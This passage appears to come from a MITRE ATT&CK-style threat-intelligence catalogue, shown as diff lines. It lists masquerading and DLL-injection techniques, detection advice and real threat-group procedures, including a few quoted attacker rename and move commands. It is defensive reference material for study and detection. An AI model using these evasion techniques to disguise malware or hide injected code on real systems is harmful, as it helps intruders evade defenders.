+- [G0119] Indrik Spider: Indrik Spider used fake updates for FlashPlayer plugin and Google Chrome as initial infection vectors.
+- [G0046] FIN7: FIN7 has attempted to run Darkside ransomware with the filename sleep.exe.
+- [C0030] Triton Safety Instrumented System Attack: In the Triton Safety Instrumented System Attack, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.
+- [S0468] Skidmap: Skidmap has created a fake rm binary to replace the legitimate Linux binary.
+- [S1100] Ninja: Ninja has used legitimate looking filenames for its loader including update.dll and x64.dll.
+- [C0018] C0018: For C0018, the threat actors renamed a Sliver payload to `vmware_kb.exe`.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 renamed software and DLLs with legitimate names to appear benign.
+- [G1020] Mustard Tempest: Mustard Tempest has used the filename `AutoUpdater.js` to mimic legitimate update files and has also used the Cyrillic homoglyph characters С `(0xd0a1)` and а `(0xd0b0)`, to produce the filename `Сhrome.Updаte.zip`.
+- [S1011] Tarrask: Tarrask has masqueraded as executable files such as `winupdate.exe`, `date.exe`, or `win.exe`.
+- [S0138] OLDBAIT: OLDBAIT installs itself in %ALLUSERPROFILE%\\Application Data\Microsoft\MediaPlayer\updatewindws.exe; the directory name is missing a space and the file name is missing the letter "o."
+- [S1182] MagicRAT: MagicRAT stores configuration data in files and file paths mimicking legitimate operating system resources.
+- [S0589] Sibot: Sibot has downloaded a DLL to the C:\windows\system32\drivers\ folder and renamed it with a .sys extension.
+- [G0069] MuddyWater: MuddyWater has disguised malicious executables and used filenames and Registry key names associated with Windows Defender.
+- [S1032] PyDCrypt: PyDCrypt has dropped DCSrv under the `svchost.exe` name to disk.
+- [G0090] WIRTE: WIRTE has named a first stage dropper `Kaspersky Update Agent` in order to appear legitimate.
+- [G0040] Patchwork: Patchwork installed its payload in the startup programs folder as "Baidu Software Update." The group also adds its second stage payload to the startup programs as “Net Monitor." They have also dropped QuasarRAT binaries as files named microsoft_network.exe and crome.exe.
+- [S0520] BLINDINGCAN: BLINDINGCAN has attempted to hide its payload by using legitimate file names such as "iconcache.db".
+- [S0698] HermeticWizard: HermeticWizard has been named `exec_32.dll` to mimic a legitimate MS Outlook .dll.
+- [S0495] RDAT: RDAT has masqueraded as VMware.exe.
+- [S0125] Remsec: The Remsec loader implements itself with the name Security Support Provider, a legitimate Windows function. Various Remsec .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare. Remsec also disguised malicious modules using similar filenames as custom network encryption software on victims.
+- [S1074] ANDROMEDA: ANDROMEDA has been installed to `C:\Temp\TrustedInstaller.exe` to mimic a legitimate Windows installer service.
+- [S0565] Raindrop: Raindrop was installed under names that resembled legitimate Windows file and directory names.
+- [G0134] Transparent Tribe: Transparent Tribe can mimic legitimate Windows directories by using the same icons and names.
+- [G0018] admin@338: admin@338 actors used the following command to rename one of their tools to a benign file name: ren "%temp%\upload" audiodg.exe
+- [C0032] C0032: During the C0032 campaign, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.
+- [S0483] IcedID: IcedID has modified legitimate .dll files to include malicious code.
+- [G1006] Earth Lusca: Earth Lusca used the command `move [file path] c:\windows\system32\spool\prtprocs\x64\spool.dll` to move and register a malicious DLL name as a Windows print processor, which eventually was loaded by the Print Spooler service.
+- [S0084] Mis-Type: Mis-Type saves itself as a file named `msdtc.exe`, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.
+- [G0135] BackdoorDiplomacy: BackdoorDiplomacy has dropped implants in folders named for legitimate software.
+- [S0526] KGH_SPY: KGH_SPY has masqueraded as a legitimate Windows tool.
+- [S0606] Bad Rabbit: Bad Rabbit has masqueraded as a Flash Player installer through the executable file install_flash_player.exe.
+- [G1024] Akira: Akira has used legitimate names and locations for files to evade defenses.
+- [S0567] Dtrack: One of Dtrack can hide in replicas of legitimate programs like OllyDbg, 7-Zip, and FileZilla.
+- [S1158] DUSTPAN: DUSTPAN is often disguised as a legitimate Windows binary such as `w3wp.exe` or `conn.exe`.
+- [S1196] Troll Stealer: Troll Stealer is typically installed via a dropper file that masquerades as a legitimate security program installation file.
+- [G0137] Ferocious Kitten: Ferocious Kitten has named malicious files update.exe and loaded them into the compromise host's “Public” folder.
+- [S1042] SUGARDUMP: SUGARDUMP has been named `CrashReporter.exe` to appear as a legitimate Mozilla executable.
+- [S0196] PUNCHBUGGY: PUNCHBUGGY mimics filenames from %SYSTEM%\System32 to hide DLLs in %WINDIR% and/or %TEMP%.
+- [S0340] Octopus: Octopus has been disguised as legitimate programs, such as Java and Telegram Messenger.
+- [S0446] Ryuk: Ryuk has constructed legitimate appearing installation folder paths by calling GetWindowsDirectoryW and then inserting a null byte at the fourth character of the path. For Windows Vista or higher, the path would appear as C:\Users\Public.
+- [G1039] RedCurl: RedCurl mimicked legitimate file names and scheduled tasks, e.g. ` MicrosoftCurrentupdatesCheck` and `MdMMaintenenceTask` to mask malicious files and scheduled tasks.
+- [S0070] HTTPBrowser: HTTPBrowser's installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.
+- [S1063] Brute Ratel C4: Brute Ratel C4 has used a payload file named OneDrive.update to appear benign.
+- [S0353] NOKKI: NOKKI is written to %LOCALAPPDATA%\MicroSoft Updatea\svServiceUpdate.exe prior being executed in a new process in an apparent attempt to masquerade as a legitimate folder and file.
+- [S0395] LightNeuron: LightNeuron has used filenames associated with Exchange and Outlook for binary and configuration files, such as winmail.dat.
+- [G0016] APT29: APT29 has renamed malicious DLLs with legitimate names to appear benign; they have also created an Azure AD certificate with a Common Name that matched the display name of the compromised service principal.
+- [G0007] APT28: APT28 has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page.
+- [C0012] Operation CuckooBees: During Operation CuckooBees, the threat actors renamed a malicious executable to `rundll32.exe` to allow it to blend in with other Windows system files.
+- [C0050] J-magic Campaign: During the J-magic Campaign, threat actors used the name “JunoscriptService” to masquerade malware as the Junos automation scripting service.
+- [S0587] Penquin: Penquin has mimicked the Cron binary to hide itself on compromised systems.
+- [S0582] LookBack: LookBack has a C2 proxy tool that masquerades as GUP.exe, which is software used by Notepad++.
+- [S0493] GoldenSpy: GoldenSpy's setup file installs initial executables under the folder %WinDir%\System32\PluginManager.
+- [G0019] Naikon: Naikon has disguised malicious programs as Google Chrome, Adobe, and VMware executables.
+- [S0622] AppleSeed: AppleSeed has the ability to rename its payload to ESTCommon.dll to masquerade as a DLL belonging to ESTsecurity.
+- [S1124] SocGholish: SocGholish has been named `AutoUpdater.js` to mimic legitimate update files.
+- [S1035] Small Sieve: Small Sieve can use variations of Microsoft and Outlook spellings, such as "Microsift", in its file names to avoid detection.
+- [S0386] Ursnif: Ursnif has used strings from legitimate system files and existing folders for its file, folder, and Registry entry names.
+- [S0409] Machete: Machete renamed payloads to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python executables.
+- [S1153] Cuckoo Stealer: Cuckoo Stealer has copied and renamed itself to DumpMediaSpotifyMusicConverter.
+- [G0114] Chimera: Chimera has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.
+- [S0595] ThiefQuest: ThiefQuest prepends a copy of itself to the beginning of an executable file while maintaining the name of the executable.
+- [S0445] ShimRatReporter: ShimRatReporter spoofed itself as AlphaZawgyl_font.exe, a specialized Unicode font.
+- [S0534] Bazar: The Bazar loader has named malicious shortcuts "adobe" and mimicked communications software.
+- [S0586] TAINTEDSCRIBE: The TAINTEDSCRIBE main executable has disguised itself as Microsoft’s Narrator.
+- [S0694] DRATzarus: DRATzarus has been named `Flash.exe`, and its dropper has been named `IExplorer`.
+- [S1039] Bumblebee: Bumblebee has named component DLLs "RapportGP.dll" to match those used by the security company Trusteer.
+- [G0143] Aquatic Panda: Aquatic Panda renamed or moved malicious binaries to legitimate locations to evade defenses and blend into victim environments.
+- [G0050] APT32: APT32 has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update. APT32 has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe.
+- [S0500] MCMD: MCMD has been named Readme.txt to appear legitimate.
+- [S1034] StrifeWater: StrifeWater has been named `calc.exe` to appear as a legitimate calculator program.
+- [S0559] SUNBURST: SUNBURST created VBScripts that were named after existing services or folders to blend into legitimate activities.
+- [G0004] Ke3chang: Ke3chang has dropped their malware into legitimate installed software paths including: `C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe`, `C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe`, `C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe`, and `C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe`.
+- [S0269] QUADAGENT: QUADAGENT used the PowerShell filenames Office365DCOMCheck.ps1 and SystemDiskClean.ps1.
+- [S0458] Ramsay: Ramsay has masqueraded as a 7zip installer.
+- [C0017] C0017: During C0017, APT41 used file names beginning with USERS, SYSUSER, and SYSLOG for DEADEYE, and changed KEYPLUG file extensions from .vmp to .upx likely to avoid hunting detections.
+- [G0081] Tropic Trooper: Tropic Trooper has hidden payloads in Flash directories and fake installer files.
+- [G0059] Magic Hound: Magic Hound has used `dllhost.exe` to mask Fast Reverse Proxy (FRP) and `MicrosoftOutLookUpdater.exe` for Plink.
+- [S1160] Latrodectus: Latrodectus has been packed to appear as a component to Bitdefender’s kernel-mode driver, TRUFOS.SYS.
+- [S0578] SUPERNOVA: SUPERNOVA has masqueraded as a legitimate SolarWinds DLL.
+- [S0013] PlugX: PlugX has been disguised as legitimate Adobe and PotPlayer files.
+- [S0402] OSX/Shlayer: OSX/Shlayer can masquerade as a Flash Player update.
+- [S0188] Starloader: Starloader has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.
+- [S0631] Chaes: Chaes has used an unsigned, crafted DLL module named hha.dll that was designed to look like a legitimate 32-bit Windows DLL.
+- [G0056] PROMETHIUM: PROMETHIUM has disguised malicious installer files by bundling them with legitimate software installers.
+- [S1019] Shark: Shark binaries have been named `audioddg.pdb` and `Winlangdb.pdb` in order to appear legitimate.
+- [S1183] StrelaStealer: StrelaStealer payloads have tailored filenames to include names identical to the name of the targeted organization or company.
+- [G1032] INC Ransom: INC Ransom has named a PsExec executable winupd to mimic a legitimate Windows update file.
+- [S0661] FoggyWeb: FoggyWeb can be disguised as a Visual Studio file such as `Windows.Data.TimeZones.zh-PH.pri` to evade detection. Also, FoggyWeb's loader can mimic a genuine `dll` file that carries out the same import functions as the legitimate Windows `version.dll` file.
+- [S0198] NETWIRE: NETWIRE has masqueraded as legitimate software including TeamViewer and macOS Finder.
+- [C0038] HomeLand Justice: During HomeLand Justice, threat actors renamed ROADSWEEP to GoXML.exe and ZeroCleare to cl.exe.
+- [S1201] TRANSLATEXT: TRANSLATEXT has been named `GoogleTranslate.crx` to masquerade as a legitimate Chrome extension.
+- [S0136] USBStealer: USBStealer mimics a legitimate Russian program called USB Disk Security.
+- [S0652] MarkiRAT: MarkiRAT can masquerade as update.exe and svehost.exe; it has also mimicked legitimate Telegram and Chrome files.
+- [C0014] Operation Wocao: During Operation Wocao, the threat actors renamed some tools and executables to appear as legitimate programs.
+- [G1014] LuminousMoth: LuminousMoth has disguised their exfiltration malware as `ZoomVideoApp.exe`.
+- [S0697] HermeticWiper: HermeticWiper has used the name `postgressql.exe` to mask a malicious payload.
+- [G0107] Whitefly: Whitefly has named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors.
+- [S0630] Nebulae: Nebulae uses functions named StartUserModeBrowserInjection and StopUserModeBrowserInjection indicating that it's trying to imitate chrome_frame_helper.dll.
+- [G0049] OilRig: OilRig has named a downloaded copy of the Plink tunneling utility as \ProgramData\Adobe.exe.
+- [G0095] Machete: Machete's Machete MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer.
+- [S0669] KOCTOPUS: KOCTOPUS has been disguised as legitimate software programs associated with the travel and airline industries.
+- [S0560] TEARDROP: TEARDROP files had names that resembled legitimate Window file and directory names.
+- [G0008] Carbanak: Carbanak has named malware "svchost.exe," which is the name of the Windows shared service host program.
+- [C0006] Operation Honeybee: During Operation Honeybee, the threat actors used a legitimate Windows executable and secure directory for their payloads to bypass UAC.
+- [G0032] Lazarus Group: Lazarus Group has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files.
+- [S0600] Doki: Doki has disguised a file as a Linux kernel module.
+- [S0562] SUNSPOT: SUNSPOT was identified on disk with a filename of taskhostsvc.exe and it created an encrypted log file at C:\Windows\Temp\vmware-vmdmp.log.
+- [S0588] GoldMax: GoldMax has used filenames that matched the system name, and appeared as a scheduled task impersonating systems management software within the corresponding ProgramData subfolder.
+- [S0128] BADNEWS: BADNEWS attempts to hide its payloads using legitimate filenames.
+- [S0058] SslMM: To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.
+- [G0012] Darkhotel: Darkhotel has used malware that is disguised as a Secure Shell (SSH) tool.
+- [G0006] APT1: The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by APT1 as a name for malware.
+- [S0182] FinFisher: FinFisher renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.
+- [G0108] Blue Mockingbird: Blue Mockingbird has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.
+- [G0121] Sidewinder: Sidewinder has named malicious files rekeywiz.exe to match the name of a legitimate Windows executable.
+- [S1018] Saint Bot: Saint Bot has been disguised as a legitimate executable, including as Windows SDK.
+- [S1078] RotaJakiro: RotaJakiro has used the filename `systemd-daemon` in an attempt to appear legitimate.
+- [S0665] ThreatNeedle: ThreatNeedle chooses its payload creation path from a randomly selected service name from netsvc.
+- [S0259] InnaputRAT: InnaputRAT variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe.
+- [S0274] Calisto: Calisto's installation file is an unsigned DMG image under the guise of Intego’s security solution for mac.
+- [S1046] PowGoop: PowGoop has used a DLL named Goopdate.dll to impersonate a legitimate Google update file.
+- [S0187] Daserf: Daserf uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.
+- [G0045] menuPass: menuPass has been seen changing malicious files to appear legitimate.
+- [S1099] Samurai: Samurai has created the directory `%COMMONPROGRAMFILES%\Microsoft Shared\wmi\` to contain DLLs for loading successive stages.
+- [S1197] GoBear: GoBear is installed through droppers masquerading as legitimate, signed software installers.
+- [S0455] Metamorfo: Metamorfo has disguised an MSI file as the Adobe Acrobat Reader Installer and has masqueraded payloads as OneDrive, WhatsApp, or Spotify, for example.
+- [G0054] Sowbug: Sowbug named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory CSIDL_APPDATA\microsoft\security.
+- [G1003] Ember Bear: Ember Bear has renamed tools to match legitimate utilities, such as renaming GOST tunneling instances to `java` in victim environments.
+- [S0583] Pysa: Pysa has executed a malicious executable by naming it svchost.exe.
+- [G0087] APT39: APT39 has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.
+- [S1070] Black Basta: The Black Basta dropper has mimicked an application for creating USB bootable drivers.
+- [G1047] Velvet Ant: Velvet Ant used a malicious DLL, `iviewers.dll`, that mimics the legitimate "OLE/COM Object Viewer" within Windows.
+- [G0094] Kimsuky: Kimsuky has renamed malware to legitimate names such as ESTCommon.dll or patch.dll.
+- [S0690] Green Lambert: Green Lambert has been disguised as a Growl help file.
+- [G1023] APT5: APT5 has named exfiltration archives to mimic Windows Updates at times using filenames with a `KB.zip` pattern.
+- [S0410] Fysbis: Fysbis has masqueraded as trusted software rsyncd and dbus-inotifier.
+- [G0033] Poseidon Group: Poseidon Group tools attempt to spoof anti-virus processes as a means of self-defense.
+- [G0091] Silence: Silence has named its backdoor "WINWORD.exe".
+- [S1041] Chinoxy: Chinoxy has used the name `eoffice.exe` in attempt to appear as a legitimate file.
+- [G0117] Fox Kitten: Fox Kitten has named binaries and configuration files svhost and dllhost respectively to appear legitimate.
+- [S0144] ChChes: ChChes copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).
+- [S0141] Winnti for Windows: A Winnti for Windows implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.
+- [G1022] ToddyCat: ToddyCat has used the name `debug.exe` for malware components.
+- [S0477] Goopy: Goopy has impersonated the legitimate goopdate.dll, which was dropped on the target system with a legitimate GoogleUpdate.exe.
+- [G1008] SideCopy: SideCopy has used a legitimate DLL file name, `Duser.dll` to disguise a malicious remote access tool.
+- [S0268] Bisonal: Bisonal has renamed malicious code to `msacm32.dll` to hide within a legitimate library; earlier versions were disguised as `winhelp`.
+- [S0015] Ixeshe: Ixeshe has used registry values and file names associated with Adobe software, such as AcroRd32.exe.
+- [S0475] BackConfig: BackConfig has hidden malicious payloads in %USERPROFILE%\Adobe\Driver\dwg\ and mimicked the legitimate DHCP service binary.
+- [S0625] Cuba: Cuba has been disguised as legitimate 360 Total Security Antivirus and OpenVPN programs.
+- [S0501] PipeMon: PipeMon modules are stored on disk with seemingly benign names including use of a file extension associated with a popular word processor.
+- [G0010] Turla: Turla has named components of LunarWeb to mimic Zabbix agent logs.
+- [G0129] Mustang Panda: Mustang Panda has used names like `adobeupdate.dat` and `PotPlayerDB.dat` to disguise PlugX, and a file named `OneDrive.exe` to load a Cobalt Strike payload.
+- [S1017] OutSteel: OutSteel attempts to download and execute Saint Bot to a statically-defined location attempting to mimic svchost: %TEMP%\\svjhost.exe.
+- [S0491] StrongPity: StrongPity has been bundled with legitimate software installation files for disguise.
+- [S0666] Gelsemium: Gelsemium has named malicious binaries `serv.exe`, `winprint.dll`, and `chrome_elf.dll` and has set its persistence in the Registry with the key value Chrome Update to appear legitimate.
+- [S0356] KONNI: KONNI has created a shortcut called "Anti virus service.lnk" in an apparent attempt to masquerade as a legitimate file.
+- [G1016] FIN13: FIN13 has masqueraded WAR files to look like legitimate packages such as, wsexample.war, wsexamples.com, examples.war, and exampl3s.war.
+- [S0334] DarkComet: DarkComet has dropped itself onto victim machines with file names such as WinDefender.Exe and winupdate.exe in an apparent attempt to masquerade as a legitimate file.
+- [S0605] EKANS: EKANS has been disguised as update.exe to appear as a valid executable.
+- [C0013] Operation Sharpshooter: During Operation Sharpshooter, threat actors installed Rising Sun in the Startup folder and disguised it as `mssync.exe`.
+- [S0260] InvisiMole: InvisiMole has disguised its droppers as legitimate software or documents, matching their original names and locations, and saved its files as mpr.dll in the Windows folder.
+- [S0086] ZLib: ZLib mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.
+- [S1084] QUIETEXIT: QUIETEXIT has attempted to change its name to `cron` upon startup. During incident response, QUIETEXIT samples have been identified that were renamed to blend in with other legitimate files.
+- [G0034] Sandworm Team: Sandworm Team has avoided detection by naming a malicious binary explorer.exe.
+- [G0106] Rocke: Rocke has used shell scripts which download mining executables and saves them with the filename "java".
+
+### T1036.006 - Masquerading: Space after Filename
+
+Description:
+
+Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to evil.txt (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed . Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.
+
+Detection:
+
+It's not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious.
+
+Procedures:
+
+- [G0082] APT38: APT38 has put several spaces before a file extension to avoid detection and suspicion.
+- [S0276] Keydnap: Keydnap puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.
+
+### T1036.007 - Masquerading: Double File Extension
+
+Description:
+
+Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: File.txt.exe may render in some views as just File.txt). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies. Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain Initial Access into a user’s system via Spearphishing Attachment then User Execution. For example, an executable file attachment named Evil.txt.exe may display as Evil.txt to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware. Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.
+
+Detection:
+
+Monitor for files written to disk that contain two file extensions, particularly when the second is an executable.
+
+Procedures:
+
+- [S1111] DarkGate: DarkGate masquerades malicious LNK files as PDF objects using the double extension .pdf.lnk.
+- [S0534] Bazar: The Bazar loader has used dual-extension executable files such as PreviewReport.DOC.exe.
+- [G0129] Mustang Panda: Mustang Panda has used an additional filename extension to hide the true file type.
+- [S1015] Milan: Milan has used an executable named `companycatalog.exe.config` to appear benign.
+
+### T1036.008 - Masquerading: Masquerade File Type
+
+Description:
+
+Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file, is 0xFF 0xD8 and the file extension is either `.JPE`, `.JPEG` or `.JPG`. Adversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., Ingress Tool Transfer) and stored (e.g., Upload Malware) so that adversaries may move their malware without triggering detections. Common non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign. Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of test.gif. A user may not know that a file is malicious due to the benign appearance and file extension. Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.
+
+Procedures:
+
+- [C0025] 2016 Ukraine Electric Power Attack: During the 2016 Ukraine Electric Power Attack, Sandworm Team masqueraded executables as `.txt` files.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group disguised malicious template files as JPEG files to avoid detection.
+- [G1017] Volt Typhoon: Volt Typhoon has appended copies of the ntds.dit database with a .gif file extension.
+- [S1190] Kapeka: Kapeka masquerades as a Microsoft Word Add-In file, with the extension `.wll`, but is a malicious DLL file.
+- [G1043] BlackByte: BlackByte masqueraded configuration files containing encryption keys as PNG files.
+- [S0650] QakBot: The QakBot payload has been disguised as a PNG file and hidden within LNK files using a Microsoft File Explorer icon.
+- [S1130] Raspberry Robin: Raspberry Robin has historically been delivered via infected USB drives containing a malicious LNK object masquerading as a legitimate folder.
+- [S1074] ANDROMEDA: ANDROMEDA has been delivered through a LNK file disguised as a folder.
+- [S1063] Brute Ratel C4: Brute Ratel C4 has used Microsoft Word icons to hide malicious LNK files.
+- [S1213] Lumma Stealer: Lumma Stealer has used payloads that resemble benign file extensions such as .mp3, .accdb, and .pub, though the files contained malicious JavaScript content.
+- [S1053] AvosLocker: AvosLocker has been disguised as a .jpg file.
+- [S1182] MagicRAT: MagicRAT can download additional executable payloads that masquerade as GIF files.
+- [S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D has disguised it's true file structure as an application bundle by adding special characters to the filename and using the icon for legitimate Word documents.
+- [S1183] StrelaStealer: StrelaStealer has been distributed as a DLL/HTML polyglot file.
+
+### T1036.009 - Masquerading: Break Process Trees
+
+Description:
+
+An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the “parent-child" relationship for detection, breaking this relationship could result in the adversary’s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs. On Linux systems, adversaries may execute a series of Native API calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree. Another example is using the “daemon” syscall to detach from the current parent process and run in the background.
+
+Procedures:
+
+- [S1161] BPFDoor: After initial execution, BPFDoor forks itself and runs the fork with the `--init` flag, which allows it to execute secondary clean up operations. The parent process terminates leaving the forked process to be inherited by the legitimate process init.
+
+### T1036.010 - Masquerading: Masquerade Account Name
+
+Description:
+
+Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during Create Account, although accounts may also be renamed at a later date. This may also coincide with Account Access Removal if the actor first deletes an account before re-creating one with the same name. Often, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management. They may also give accounts generic, trustworthy names, such as “admin”, “help”, or “root.” Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior to Account Discovery. Note that this is distinct from Impersonation, which describes impersonating specific trusted individuals or organizations, rather than user or service account names.
+
+Procedures:
+
+- [S0143] Flame: Flame can create backdoor accounts with login `HelpAssistant` on domain connected systems if appropriate rights are available.
+- [G1046] Storm-1811: Storm-1811 has created Microsoft Teams accounts that spoof IT support and helpdesk members for use in application and voice phishing.
+- [G0059] Magic Hound: Magic Hound has created local accounts named `help` and `DefaultAccount` on compromised machines.
+- [G0035] Dragonfly: Dragonfly has created accounts disguised as legitimate backup and service accounts as well as an email administration account.
+- [S0382] ServHelper: ServHelper has created a new user named `supportaccount`.
+- [C0025] 2016 Ukraine Electric Power Attack: During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, “admin” and “система” (System).
+- [G0022] APT3: APT3 has been known to create or enable accounts, such as support_388945a0.
+
+### T1036.011 - Masquerading: Overwrite Process Arguments
+
+Description:
+
+Adversaries may modify a process's in-memory arguments to change its name in order to appear as a legitimate or benign process. On Linux, the operating system stores command-line arguments in the process’s stack and passes them to the `main()` function as the `argv` array. The first element, `argv[0]`, typically contains the process name or path - by default, the command used to actually start the process (e.g., `cat /etc/passwd`). By default, the Linux `/proc` filesystem uses this value to represent the process name. The `/proc//cmdline` file reflects the contents of this memory, and tools like `ps` use it to display process information. Since arguments are stored in user-space memory at launch, this modification can be performed without elevated privileges. During runtime, adversaries can erase the memory used by all command-line arguments for a process, overwriting each argument string with null bytes. This removes evidence of how the process was originally launched. They can then write a spoofed string into the memory region previously occupied by `argv[0]` to mimic a benign command, such as `cat resolv.conf`. The new command-line string is reflected in `/proc//cmdline` and displayed by tools like `ps`.
+
+Procedures:
+
+- [S1161] BPFDoor: BPFDoor overwrites the `argv[0]` value used by the Linux `/proc` filesystem to determine the command line and command name to display for each process. BPFDoor selects a name from 10 hardcoded names that resemble Linux system daemons, such as; `/sbin/udevd -d`, `dbus-daemon --system`, `avahi-daemon: chroot helper`, `/sbin/auditd -n`, and `/usr/lib/systemd/systemd-journald`.
+
+
+### T1055.001 - Process Injection: Dynamic-link Library Injection
+
+Description:
+
+Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process. DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LoadLibrary API responsible for loading the DLL). Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary). Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's AddressOfEntryPoint before starting a new thread in the target process. This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.
+
+Detection:
+
+Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+Procedures:
+
+- [S1027] Heyoka Backdoor: Heyoka Backdoor can inject a DLL into rundll32.exe for execution.
+- [S1018] Saint Bot: Saint Bot has injected its DLL component into `EhStorAurhn.exe`.
+- [S0082] Emissary: Emissary injects its DLL file into a newly spawned Internet Explorer process.
+- [S0125] Remsec: Remsec can perform DLL injection.
+- [S1066] DarkTortilla: DarkTortilla can use a .NET-based DLL named `RunPe6` for process injection.
+- [S0089] BlackEnergy: BlackEnergy injects its DLL component into svchost.exe.
+- [G0010] Turla: Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges.
